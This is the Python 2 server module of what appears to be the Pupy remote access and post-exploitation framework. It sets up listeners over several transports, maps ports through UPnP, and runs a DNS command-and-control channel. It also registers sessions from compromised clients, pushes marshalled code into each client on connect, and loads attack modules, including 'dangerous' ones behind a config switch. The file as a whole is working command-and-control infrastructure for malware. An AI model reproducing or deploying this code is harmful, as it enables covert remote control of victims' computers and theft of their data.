# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from threading import Thread, Event, Lock

import imp

from os import path, listdir, stat
from itertools import count, ifilterfalse
from netaddr import IPAddress
from random import randint

import socket
import errno
import traceback

from pupylib.PupyErrors import PupyModuleError
from pupylib.PupyErrors import PupyModuleDisabled, PupyModuleNotFound
from pupylib.PupyCategories import PupyCategories
from pupylib.PupyConfig import PupyConfig
from pupylib.PupyService import PupyBindService
from pupylib.PupyCompile import pupycompile
from pupylib.PupyOutput import Error, Line, Color
from pupylib.PupyModule import QA_STABLE, IgnoreModule
from pupylib.PupyDnsCnc import PupyDnsCnc
from pupylib.PupyTriggers import event, event_to_string, register_event_id, CUSTOM
from pupylib.PupyTriggers import ON_CONNECT, ON_DISCONNECT, ON_START, ON_EXIT
from pupylib.PupyTriggers import RegistrationNotAllowed, UnregisteredEventId
from pupylib.PupyWeb import PupyWebServer
from pupylib.PupyOffload import PupyOffloadManager, OffloadProxyCommonError

from pupylib import PupyService
from pupylib import PupyClient
from pupylib import Credentials

from .utils.rpyc_utils import obtain
from .utils.network import get_listener_ip_with_local

from network.conf import transports
from network.transports.ssl.conf import PupySSLAuthenticator
from network.lib.connection import PupyConnectionThread
from network.lib.servers import PupyTCPServer
from network.lib.streams.PupySocketStream import PupySocketStream, PupyUDPSocketStream
from network.lib.streams.PupyVirtualStream import PupyVirtualStream

from network.lib.utils import parse_transports_args
from network.lib.base import chain_transports
from network.lib.transports.httpwrap import PupyHTTPWrapperServer
from network.lib.igd import IGDClient, UPNPError
from network.lib.streams.PupySocketStream import PupyChannel

from triggers import Triggers

from . import getLogger
logger = getLogger('server')
blocks_logger = logger.getChild('whitelist')

class ListenerException(Exception):
    pass

class PupyKCPSocketStream(PupySocketStream):
    def __init__(self, *args, **kwargs):
        PupySocketStream.__init__(self, *args, **kwargs)
        self.KEEP_ALIVE_REQUIRED = 15

class Listener(Thread):
    def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None, pproxy=None):
        Thread.__init__(self)
        self.daemon = True
        self.name = 'Listener({})'.format(name)

        self.igd = igd
        self.server = None

        self.name = name.lower().strip()
        self.transport = transports[self.name]()
        self.authenticator = self.transport.authenticator() if \
          self.transport.authenticator else None

        self.pupsrv = pupsrv
        self.config = pupsrv.config
        self.httpd = httpd

        # Where to connect
        self.external = external
        self.external_port = None
        self.pproxy = pproxy

        # Where to bind
        self.address = local or ''
        self.igd_mapping = False

        # Is where to connect placed at our PC
        self.local = True

        if httpd and not self.transport.dgram:
            self.transport.server_transport = chain_transports(
                PupyHTTPWrapperServer.custom(server=self.pupsrv),
                self.transport.server_transport
            )

        if args:
            args = [x.strip() for x in args.split(' ', 1) if x]
        else:
            args = []

        if not args:
            self.port = randint(20000, 50000)
            self.ipv6 = False
        else:
            if ':' in args[0]:
                ip, port = args[0].rsplit(':', 1)
                try:
                    if '=' in ip:
                        extip, ip = ip.split('=', 1)
                    else:
                        extip = None

                    address = IPAddress(ip)
                    self.address = str(address)

                    if extip:
                        if extip in ('?', 'igd'):
                            self.external = extip
                        else:
                            self.external = str(IPAddress(extip))

                    elif self.address:
                        self.external = self.address

                    self.ipv6 = address.version == 6
                except Exception, e:
                    raise ListenerException('Invalid IP: {} ({})'.format(ip, e))

            else:
                port = args[0]
                self.ipv6 = False

        if self.pproxy:
            self.external = self.pproxy.external

        elif not self.external or self.external in ('?', 'igd'):
            # If IGD enabled then we likely want to have mappings
            # Why to have mappings if our external IP remains empty?
            if self.igd and self.igd.available:
                extip, self.local = get_listener_ip_with_local(
                    external=True,
                    config=pupsrv.config,
                    igd=self.igd
                )

                self.external = str(IPAddress(extip))
            elif self.address and self.address not in ('0.0.0.0', '::'):
                self.external = self.address
            else:
                extip, self.local = get_listener_ip_with_local(
                    config=pupsrv.config,
                    igd=self.igd
                )

                try:
                    self.external = str(IPAddress(extip))
                except:
                    self.external = '127.0.0.1'

        if '=' in port:
            port = [x.strip() for x in port.split('=', 1)]
            try:
                self.external_port = int(port[0])
            except:
                raise ListenerException("Invalid external port: {}".format(port[0]))

            try:
                self.port = int(port[1])
            except:
                raise ListenerException("Invalid local port: {}".format(port[1]))
        else:
            try:
                self.port = int(port)
            except:
                raise ListenerException("Invalid local port: {}".format(port[1]))

            self.external_port = self.port

        if self.local:
            self.external_port = self.port

        transport_kwargs = self.transport.server_transport_kwargs

        if len(args) > 1:
            opt_args = parse_transports_args(args[1], exit=False)
        else:
            opt_args = []

        for val in opt_args:
            val = val.lower()
            if val in transport_kwargs:
                transport_kwargs[val] = opt_args[val]
            else:
                logger.warning('Unknown transport argument: %s', val)

        self.kwargs = transport_kwargs

        try:
            self.transport.parse_args(self.kwargs)
        except Exception, e:
            logger.exception(e)

    def init(self):
        method = None

        stream = self.transport.stream
        transport = self.transport.server_transport
        server = self.transport.server
        transport_kwargs = self.transport.server_transport_kwargs
        ipv6 = self.ipv6
        igd = self.igd
        external = self.external
        external_port = self.external_port
        authenticator = self.authenticator

        if self.pproxy:
            if type(authenticator) == PupySSLAuthenticator:
                extra = {
                    'certs': {
                        'ca': authenticator.castr,
                        'cert': authenticator.certstr,
                        'key': authenticator.keystr,
                    }
                }
            else:
                extra = {}

            if stream == PupyUDPSocketStream:
                stream = PupyKCPSocketStream
                method = self.pproxy.kcp
            elif type(authenticator) == PupySSLAuthenticator:
                method = self.pproxy.ssl
            elif stream == PupySocketStream:
                method = self.pproxy.tcp

            server = PupyTCPServer

            authenticator = None
            ipv6 = False
            igd = None
            self.port = 0

        self.server = server(
            PupyService,
            port=self.port, hostname=self.address,
            authenticator=authenticator,
            stream=stream,
            transport=transport,
            transport_kwargs=transport_kwargs,
            pupy_srv=self.pupsrv,
            ipv6=ipv6,
            igd=igd,
            external=external,
            external_port=external_port
        )

        if not (self.pproxy and method):
            return

        ## Workaround..
        self.server.listener.close()
        self.server.listener = method(self.external_port, extra=extra)

    def run(self):
        self.server.start()

    def close(self):
        if self.igd and self.igd_mapping:
            try:
                self.igd.DeletePortMapping(
                    self.external_port, self.port)
            except UPNPError as e:
                logger.error(
                    "Couldn't delete IGD Mapping: {}".format(e.description)
                )
            except:
                pass

        if self.server:
            self.server.close()

    def __del__(self):
        self.close()

    def __str__(self):
        if self.port == 0:
            return '{}: pproxy:{}:{}'.format(
                self.name, self.external, self.external_port
            )

        result = str(self.port)
        if self.address:
            result = '{}:{}'.format(
                self.address if not self.ipv6 else '[{}]'.format(self.address),
                self.port
            )

        if self.external and not self.local and self.external != self.address:
            if not self.address:
                result = '0.0.0.0:{}'.format(result)

            result = 'Remote: {}:{} -> Local: {}'.format(
                self.external, self.external_port, result
            )

        if self.kwargs:
            result += ' ' + ' '.join(
                '{}={}'.format(
                    k, v if k != 'password' else '*'*len(v)
                ) for k,v in self.kwargs.iteritems())

        return '{}: {}'.format(self.name, result)


class PupyServer(object):
    SUFFIXES = tuple([
        suffix for suffix, _, rtype in imp.get_suffixes() \
        if rtype == imp.PY_SOURCE
    ])

    def __init__(self, config, credentials):
        self.httpd = None
        self.pupweb = None
        self.clients = []
        self.jobs = {}
        self.jobs_id = 1
        self.clients_lock = Lock()
        self._current_id = []
        self._current_id_lock = Lock()
        self.modules = {}
        self._modules_stats = {}

        self.motd = {
            'fail': [],
            'ok': []
        }

        self.config = config or PupyConfig()
        self.credentials = credentials or Credentials()

        self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
        self.handler = None
        self.handler_registered = Event()
        self.triggers = Triggers()
        self.categories = PupyCategories(self)
        self.igd = None
        self.finished = Event()
        self.finishing = Event()

        self.pproxy_listener = None

        self._cleanups = []
        self._singles = {}

        pproxy = self.config.get('pproxy', 'address')
        ca = self.config.get('pproxy', 'ca')
        key = self.config.get('pproxy', 'key')
        cert = self.config.get('pproxy', 'crt')
        via = self.config.get('pproxy', 'via')

        pproxy_listener_required = self.config.getboolean('pproxy', 'listener')
        pproxy_dnscnc_required = self.config.getboolean('pproxy', 'dnscnc')

        pproxy_dnscnc = None

        if pproxy and ca and key and cert and (pproxy_listener_required or pproxy_dnscnc_required):
            try:
                pproxy_manager = PupyOffloadManager(
                    pproxy, ca, key, cert, via)

                if pproxy_listener_required:
                    self.pproxy_listener = pproxy_manager

                if pproxy_dnscnc_required:
                    pproxy_dnscnc = pproxy_manager

                self.motd['ok'].append(
                    'Offload Proxy: proxy={} external={}{}'.format(
                        pproxy,
                        pproxy_manager.external,
                        ' via {}'.format(via) if via else ''))

            except (socket.error, OffloadProxyCommonError), e:
                self.motd['fail'].append('Offload proxy unavailable: {}'.format(e))

            except Exception, e:
                logger.exception(e)
                self.motd['fail'].append('Using Pupy Offload Proxy: Failed: {}'.format(e))

        if self.config.getboolean('pupyd', 'httpd'):
            self.httpd = True

        if not (self.pproxy_listener and pproxy_dnscnc):
            try:
                try:
                    igd_url = None
                    igd_enabled = config.getboolean('pupyd', 'igd')
                except ValueError:
                    igd = config.get('pupyd', 'igd')
                    if igd:
                        igd_enabled = True
                        igd_url = igd

                self.igd = IGDClient(
                    available=igd_enabled,
                    ctrlURL=igd_url
                )
                self.motd['ok'].append('IGDClient enabled')
            except UPNPError as e:
                self.motd['fail'].append('IGDClient failed: {}'.format(e))

        self.dnscnc = None

        self.listeners = {}

        dnscnc = self.config.get('pupyd', 'dnscnc')
        if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            try:
                self.dnscnc = PupyDnsCnc(
                    igd=self.igd,
                    config=self.config,
                    credentials=self.credentials,
                    listeners=self.get_listeners,
                    cmdhandler=self.handler,
                    pproxy=pproxy_dnscnc,
                    server=self
                )
            except Exception, e:
                logger.error('DnsCNC failed: %s', e)


    def get_listeners(self):
        return self.listeners

    @property
    def address(self):
        # Address of default listener
        for listener in self.listeners.values():
            if listener and listener.address:
                return listener.address

        return ''

    @property
    def port(self):
        # Port of default listener
        for listener in self.listeners.values():
            return listener.port

    def start_webserver(self, motd=False):
        if not self.config.getboolean('pupyd', 'webserver'):
            return False

        if not self.pupweb:
            self.pupweb = PupyWebServer(self, self.config)
            self.pupweb.start()
            self.display('WebServer started ({}:{}, webroot={})'.format(
                self.pupweb.hostname, self.pupweb.port, self.pupweb.wwwroot),
                motd=motd)
        else:
            self.display(
                'WebServer already started', error=True, motd=motd)

        return True

    def create_id(self):
        """ return first lowest unused session id """
        with self._current_id_lock:
            new_id = next(ifilterfalse(self._current_id.__contains__, count(1)))
            self._current_id.append(new_id)
            return new_id

    def move_id(self, dst_id, src_id):
        """ return first lowest unused session id """

        src_client = None
        dst_client = None

        with self.clients_lock:
            if isinstance(dst_id, int):
                dst_client = [x for x in self.clients if x.desc['id'] == dst_id]
                if not dst_client:
                    raise ValueError('Client with id {} not found'.format(dst_id))
                dst_client = dst_client[0]
            else:
                dst_client = dst_id

            if isinstance(src_id, int):
                src_client = [x for x in self.clients if x.desc['id'] == src_id]
                if not src_client:
                    raise ValueError('Client with id {} not found'.format(src_id))
                src_client = src_client[0]
            else:
                src_client = src_id

            with self._current_id_lock:
                self._current_id.remove(dst_client.desc['id'])
                self._current_id.append(src_client.desc['id'])

            dst_client.desc['id'] = src_client.desc['id']

    def free_id(self, id):
        with self._current_id_lock:
            try:
                self._current_id.remove(int(id))
            except ValueError:
                logger.debug('Id not found in current_id list: %s', id)

    def register_handler(self, instance):
        """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
        self.handler = instance

        if self.dnscnc:
            self.dnscnc.cmdhandler = instance

        self.handler_registered.set()

        event(ON_START, None, self)

    def _whitelist(self, nodeid, cid):
        if not self.config.getboolean('pupyd', 'whitelist'):
            return True

        if type(cid) in (int, long):
            cid = '{:016x}'.format(cid)

        if type(nodeid) in (int, long):
            nodeid = '{:012x}'.format(nodeid)

        if not cid or not nodeid:
            return self.config.getboolean('pupyd', 'allow_by_default')

        allowed_nodes = self.config.get('cids', cid)

        if not allowed_nodes:
            if self.config.getboolean('pupyd', 'allow_by_default'):
                return True
            return False

        return nodeid in set([x.strip().lower() for x in allowed_nodes.split(',')])

    def add_client(self, conn):
        client = None

        conn.execute(
            'import marshal;exec marshal.loads({})'.format(
                repr(pupycompile(
                    path.join(
                        self.config.root, 'pupylib', 'PupyClientInitializer.py'),
                    path=True, raw=True))))

        uuid = obtain(conn.namespace['get_uuid']())

        if not self._whitelist(uuid.get('node'), uuid.get('cid')):
            blocks_logger.warning(
                'Rejected: {} on {}'.format(uuid.get('cid'), uuid.get('node')))
            conn._conn.close()
            return

        with self.clients_lock:
            client_id = self.create_id()
            client_info = {}

            try:
                client_info = conn.get_infos()
                client_info = obtain(client_info)
            except:
                client_info = {
                    "launcher": str(conn.get_infos("launcher")),
                    "launcher_args": [x for x in conn.get_infos("launcher_args")],
                    "transport": str(conn.get_infos("transport")),
                    "daemonize": bool(conn.get_infos("daemonize")),
                    "native": bool(conn.get_infos("native")),
                    "sid": conn.get_infos("sid") or '',
                }

            conn_id = obtain(conn._conn._config['connid'])

            try:
                if type(conn_id) is list:
                    address = conn_id[0]
                address = conn_id.rsplit(':',1)[0]

            except:
                address = str(address)

            client_info.update({
                "id": client_id,
                "conn": conn,
                "address": address
            })

            client_info.update(uuid)

            client = PupyClient(client_info, self)
            self.clients.append(client)

            if self.handler:
                try:
                    client_ip, client_port = conn_id.rsplit(':', 1)
                except:
                    client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads

                addr = obtain(conn.modules.pupy.get_connect_back_host())
                remote = ' ({}{}:{})'.format(
                    '{} <- '.format(addr) if '0.0.0.0' not in addr else '',
                    client_ip, client_port)

                user = client_info.get('user','?')
                if type(user) == unicode:
                    user = user.encode('utf-8')

                user_info = user
                if '\\' not in user:
                    hostname = client_info.get('hostname','?')
                    if type(hostname) == unicode:
                        hostname = hostname.encode('utf-8')

                    user_info = user_info + '@' + hostname

                self.info('Session {} opened ({}){}'.format(
                    client_id, user_info, remote if client_port != 0 else '')
                )

        if client and self.handler:
            event(ON_CONNECT, client, self, **client.desc)

    def remove_client(self, conn):
        with self.clients_lock:
            client = [x for x in self.clients if (x.conn is conn or x is conn)]
            if not client:
                logger.debug('No clients matches request: %s', conn)
                return

            client = client[0]

            event(ON_DISCONNECT, client, self, **client.desc)

            self.clients.remove(client)
            self.free_id(client.desc['id'])

            self.info('Session {} closed'.format(client.desc['id']))

    def get_clients(self, search_criteria):
        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
        #if the criteria is a simple id we return the good client

        if not search_criteria:
            return self.clients

        try:
            indexes = set(
                int(x) for x in str(search_criteria).split(',')
            )

            return [
                c for c in self.clients if c.desc['id'] in indexes
            ]
        except Exception:
            pass

        if not type(search_criteria) in (str, unicode):
            return

        clients=set([])

        if search_criteria=="*":
            return self.clients

        for c in self.clients:
            take = False
            tags = self.config.tags(c.node())
            for sc in search_criteria.split():
                tab = sc.split(":",1)
                #if the field is specified we search for the value in this field
                if len(tab)==2 and tab[0] in c.desc:
                    take=True
                    if not tab[1].lower() in str(c.desc[tab[0]]).lower():
                        take=False
                        break
                elif len(tab)==2 and tab[0] == 'tag' and tab[1] in tags:
                    take = True
                elif len(tab)==2 and tab[0] == 'tags':
                    if '&' in tab[1]:
                        take = all(x in tags for x in tab[1].split('&') if x)
                    else:
                        take = any(x in tags for x in tab[1].split(',') if x)
                elif len(tab)!=2:#if there is no field specified we search in every field for at least one match
                    take=False
                    if tab[0] in tags:
                        take = True
                    else:
                        for k,v in c.desc.iteritems():
                            if type(v) is unicode or type(v) is str:
                                if tab[0].lower() in v.decode('utf8').lower():
                                    take=True
                                    break
                            else:
                                if tab[0].lower() in str(v).decode('utf8').lower():
                                    take=True
                                    break
                        if not take:
                            break
            if take:
                clients.add(c)

        return list(clients)

    def get_clients_list(self):
        return self.clients

    def iter_modules(self, by_clients=False, clients_filter=None):
        """ iterate over all modules """

        clients = None
        if by_clients:
            clients = self.get_clients(clients_filter)
            if not clients:
                return

        self._refresh_modules()
        for module_name in self.modules:
            try:
                module = self.get_module(module_name)
            except PupyModuleDisabled:
                continue

            if clients is not None:
                for client in clients:
                    if module.is_compatible_with(client):
                        yield module
                        break
            else:
                yield module

    def get_module_name_from_category(self, modpath):
        """ take a category virtual path and return the module's name or the path untouched if not found """
        mod = self.categories.get_module_from_path(modpath)
        if mod:
            return mod.get_name()
        else:
            return modpath

    def get_aliased_modules(self):
        """ return a list of aliased module names that have to be displayed as commands """
        modules = []
        for m in self.iter_modules():
            if not m.is_module:
                modules.append((m.get_name(), m.__doc__))
        return modules

    def _refresh_modules(self, force=False):
        files = {}

        paths = set([
            path.abspath(x) for x in [
                self.config.root, '.',
            ]
        ])

        for modpath in paths:
            modules = path.join(modpath, 'modules')
            if not path.isdir(modules):
                continue

            for x in listdir(modules):
                modname = '.'.join(x.rsplit('.', 1)[:-1])
                modpath = path.join(modules, x)

                try:
                    valid = all([
                        x.endswith(self.SUFFIXES),
                        not x.startswith(('__init__', '.')),
                        path.isfile(modpath)
                    ])

                    if valid:
                        files[modname] = modpath

                except Exception, e:
                    logger.exception(e)

        for modname, modpath in files.iteritems():
            current_stats = stat(modpath)

            if not force and modname in self.modules and \
              self._modules_stats[modname] == current_stats.st_mtime:
                continue

            try:
                module_object = imp.load_source(modname, modpath)
                logger.debug('Load module %s', modname)
                self.modules[modname] = module_object
                self._modules_stats[modname] = current_stats.st_mtime

            except IgnoreModule, e:
                logger.debug('Ignore module %s: %s', modname, e)
                continue

            except Exception, e:
                tb = '\n'.join(traceback.format_exc().split('\n')[1:-2])
                error = Line(
                    Error('Invalid module:'),
                    Color(modname, 'yellow'),
                    'at ({}): {}. Traceback:\n{}'.format(
                    modpath, e, tb))

                self.info(error, error=True)

    def get_module(self, name):
        enable_dangerous_modules = self.config.getboolean('pupyd', 'enable_dangerous_modules')

        if name not in self.modules:
            self._refresh_modules(force=True)

        if name not in self.modules:
            raise PupyModuleNotFound('No such module')

        module = self.modules[name]
        class_name = None

        if hasattr(module, '__class_name__'):
            class_name = module.__class_name__
            if not hasattr(module, class_name):
                logger.error(
                    'script %s has a class_name="%s" global variable '
                    'defined but this class does not exists in the script!',
                    name, class_name)

        if hasattr(module, '__events__'):
            for event_id, event_name in module.__events__.iteritems():
                try:
                    registered_event_name = event_to_string(event_id)
                    if registered_event_name != event_name:
                        logger.error(
                            'script "%s" registers event_id %08x as "%s", '
                            'but it is already registered as "%s"',
                            name, event_name, registered_event_name)

                        raise PupyModuleDisabled('Modules with errors are disabled.')

                except UnregisteredEventId:
                    try:
                        register_event_id(event_id, event_name)
                    except RegistrationNotAllowed:
                        logger.error(
                            'script "%s" registers event_id 0x%08x which is not allowed, '
                            'eventid should be >0x%08x',
                            name, event_id, CUSTOM)

                        raise PupyModuleDisabled('Modules with errors are disabled.')

        if not class_name:
            #TODO automatically search the class name in the file
            exit("Error : no __class_name__ for module %s"%module)

        module_class = getattr(module, class_name)

        if not enable_dangerous_modules and module_class.qa != QA_STABLE:
            logger.debug('Ignore dangerous module %s', name)
            raise PupyModuleDisabled('Dangerous modules are disabled.')

        return module_class

    def module_parse_args(self, module_name, args):
        """ This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
        module=self.get_module(module_name)
        ps=module(None,None)
        if ps.known_args:
            return ps.arg_parser.parse_known_args(args)
        else:
            return ps.arg_parser.parse_args(args)

    def del_job(self, job_id):
        if job_id is not None:
            job_id=int(job_id)
            if job_id in self.jobs:
                del self.jobs[job_id]

    def add_job(self, job):
        job.id=self.jobs_id
        self.jobs[self.jobs_id]=job
        self.jobs_id+=1

    def get_job(self, job_id):
        try:
            job_id=int(job_id)
        except ValueError:
            raise PupyModuleError("job id must be an integer !")
        if job_id not in self.jobs:
            raise PupyModuleError("%s: no such job !"%job_id)
        return self.jobs[job_id]

    def create_virtual_connection(self, transport, peer):
        if transport not in transports:
            logger.error('Unknown transport: %s', transport)
            return

        logger.debug('create_virtual_connection(%s, %s)', transport, peer)

        transport_conf = transports.get(transport)
        transport_class = transport_conf().server_transport

        logger.debug('create_virtual_connection(%s, %s) - transport - %s / %s',
            transport, peer, transport_conf, transport_class)

        stream = PupyVirtualStream(transport_class)

        vc = PupyConnectionThread(
            self,
            PupyService,
            PupyChannel(stream),
            ping=stream.KEEP_ALIVE_REQUIRED,
            config={
                'connid': '{}:{}'.format(peer, id(self))
            })

        def activate(peername, on_receive):
            logger.debug('VirtualStream (%s, %s) - activating',
                stream, peername)

            stream.activate(peername, on_receive)

            logger.debug('VirtualStream (%s, %s) - starting thread',
                stream, peername)

            vc.start()

            logger.debug('VirstualStream (%s, %s) - activated',
                stream, peername)

        return activate, stream.submit, stream.close

    def connect_on_client(self, launcher):
        """ connect on a client that would be running a bind payload """

        try:
            stream=launcher.iterate().next()
        except socket.error as e:
            self.handler.display_error("Couldn't connect to pupy: {}".format(e))
            return

        host = launcher.args.host[0] \
          if type(launcher.args.host) in (list,tuple) else launcher.args.host

        self.handler.display_success('Starting session ({})'.format(host))

        bgsrv=PupyConnectionThread(
            self,
            PupyBindService,
            PupyChannel(stream),
            ping=stream.KEEP_ALIVE_REQUIRED,
            config={
                'connid': host
            })
        bgsrv.start()

    def start(self):
        self.handler_registered.wait()
        self.start_webserver(motd=True)

        listeners = set([
            x.strip() for x in (
                self.config.get('pupyd', 'listen') or 'ssl'
            ).split(',')
        ])

        for name in listeners:
            if name in transports:
                self.add_listener(name, motd=True)
            else:
                self.motd['fail'].append('Unknown transport: {}'.format(name))

        self.handler.add_motd(self.motd)

    def add_listener(self, name, config=None, motd=False, ignore_pproxy=False):
        if self.listeners and name in self.listeners:
            self.handler.display_warning('Listener {} alrady registered'.format(name))
            return

        if name not in transports:
            error = 'Transport {} is not registered. To show available: listen -L'.format(repr(name))

            if motd:
                self.motd['fail'].append(error)
            else:
                self.handler.display_error(error)

            return

        listener_config = config or self.config.get('listeners', name)
        if not listener_config:
            error = 'Transport {} does not have default settings. Specfiy args (at least port)'.format(
                repr(name))

            if motd:
                self.motd['fail'].append(error)
            else:
                self.handler.display_error(error)
            return

        try:
            listener = Listener(
                self,
                name,
                listener_config,
                httpd=self.httpd,
                igd=self.igd,
                local=self.config.get('pupyd', 'address'),
                external=self.config.get('pupyd', 'external'),
                pproxy=None if ignore_pproxy else self.pproxy_listener
            )

        except (ListenerException, ValueError), e:
            error = 'Listener: {}: Error: {}'.format(repr(name), e)

            if motd:
                self.motd['fail'].append(error)
            else:
                self.handler.display_error(error)
            return

        except Exception, e:
            logger.exception(e)
            return

        self.listeners[name] = listener

        error = True
        message = 'Listen: {}'.format(listener)

        try:
            self.listeners[name].init()
            self.listeners[name].start()
            error = False

        except socket.error as e:
            if e.errno == errno.EACCES:
                error = 'Listen: {}: Insufficient privileges to bind'.format(listener)
            elif e.errno == errno.EADDRINUSE:
                error = 'Listen: {}: Address/Port already used'.format(listener)
            elif e.errno == errno.EADDRNOTAVAIL:
                error = 'Listen: {}: No network interface with addresss {}'.format(
                    listener, listener.address)
            else:
                error = 'Listen: {}: {}'.format(listener, e)

        except Exception as e:
            error = '{}: {}'.format(listener, e)
            logger.exception(e)

        if error:
            del self.listeners[name]

        self.display(message, error, motd)

    def display(self, message, error=False, motd=False):
        if motd or not self.handler:
            if error:
                self.motd['fail'].append(error)
            else:
                self.motd['ok'].append(message)
        else:
            if error:
                self.handler.display_error(error)
            else:
                self.handler.display_success(message)

    def info(self, message, error=False):
        if self.handler:
            self.handler.display_srvinfo(message)
        elif error:
            self.motd['fail'].append(message)
        else:
            self.motd['ok'].append(message)

    def remove_listener(self, name):
        if name not in self.listeners:
            self.handler.display_warning('{} - is not running'.format(name))
            return

        self.listeners[name].close()
        self.handler.display_srvinfo('Closed: {}'.format(self.listeners[name]))
        del self.listeners[name]

    def register_cleanup(self, cleanup):
        self._cleanups.append(cleanup)

    def single(self, ctype, *args, **kwargs):
        single = self._singles.get(ctype)
        if not single:
            single = ctype(*args, **kwargs)
            self._singles[ctype] = single

        return single

    def stop(self):
        if self.finishing.is_set():
            return
        else:
            self.finishing.set()

        event(ON_EXIT, None, self)

        for cleanup in self._cleanups:
            cleanup()

        self._cleanups = []

        for name in self.listeners.keys():
            self.remove_listener(name)

        if self.pupweb:
            self.pupweb.stop()
            self.pupweb = None

        self.finished.set()
